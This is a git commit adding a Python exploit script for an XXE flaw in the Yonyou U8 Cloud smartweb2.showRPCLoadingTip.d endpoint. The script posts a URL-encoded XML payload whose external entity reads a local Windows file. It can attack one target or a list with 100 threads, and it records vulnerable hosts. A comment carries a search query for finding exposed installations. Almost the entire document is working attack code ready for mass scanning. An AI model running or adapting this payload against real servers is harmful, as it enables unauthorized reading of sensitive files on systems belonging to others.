eb6885b5fff1a8ea1317a588746cd637bd067388
Sarah0x7e <165890913+Sarah0x7e@users.noreply.github.com>
2024-06-27 13:15:35 +0800

    Add files via upload

---
+++ YYU8Cloud_smartweb2.XXE.py
@@ -0,0 +1,86 @@
+#用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞
+#用友U8 Cloud smartweb2.showRPCLoadingTip.d 接口处存在XML实体，攻击者可通过该漏洞获取敏感文件信息，攻击者添加恶意内容，通过易受攻击的代码，就能够攻击包含缺陷的XML处理器。
+#app="用友-U8-Cloud" YYU8Cloud_smartweb2.XXE.py
+# 导包
+import requests,sys,argparse,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
+from colorama import Fore, Style
+BLUE = Fore.BLUE
+RESET = Style.RESET_ALL
+# 指纹模块
+def banner():
+    banner = """
+
+ ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
+▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
+▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
+░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
+ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
+ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
+  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
+  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
+      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
+                                     ░                                                        
+                                    author:           🐖sawa🐇
+                                    version:          1.0.0
+                                    For:              用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞
+"""
+    print(banner)
+# 主函数模块
+def main():
+    # 先调用指纹
+    banner()
+    # 描述信息
+    parser = argparse.ArgumentParser(description="this is a 用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE漏洞")
+    # -u指定单个url检测， -f指定批量url进行检测
+    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
+    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
+    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
+    # 调用
+    args = parser.parse_args()
+    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+
+# poc模块
+def poc(target):
+    payload_url ="/hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1"
+    url = target+payload_url
+    headers = {
+        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+        'Accept-Language':'zh-CN,zh;q=0.9',
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Connection':'close',
+    }
+    data = "__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=%3C%21DOCTYPE+z+%5B%3C%21ENTITY+test++SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%5D%3E%3Crpc+transaction%3D%221%22+method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset+type%3D%22Custom%22+id%3D%22dsResetPwd%22%3E%3Cf+name%3D%22user%22%3E%3C%2Ff%3E%3C%2Fdataset%3E%3C%2Fdef%3E%3Cdata%3E%3Crs+dataset%3D%22dsResetPwd%22%3E%3Cr+id%3D%221%22+state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1%3C%2Fv%3E%3C%2Fn%3E%3C%2Fr%3E%3C%2Frs%3E%3C%2Fdata%3E%3Cvps%3E%3Cp+name%3D%22__profileKeys%22%3E%26test%3B%3C%2Fp%3E%3C%2Fvps%3E%3C%2Frpc%3E"
+    try:
+        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
+        if res.status_code == 200 and 'fonts' in res.text:#读取 win.ini 配置文件
+            print(f"{BLUE}[+]该{target}存在漏洞{RESET}")
+            with open ('result.txt','a',encoding='utf-8') as fp:
+                fp.write(target+"\n")
+        else :
+            print(f"[-]该{target}不存在漏洞")
+            with open ('without-bug.txt','a',encoding='utf-8') as fp:
+                fp.write(target+"\n")        
+    except Exception as e:
+        print(f"[*]该url存在问题{target}"+str(e))
+        with open ('warning.txt','a',encoding='utf-8') as fp:
+            fp.write(target+"\n")
+
+# 主函数入口
+if __name__ == "__main__":
+    main()
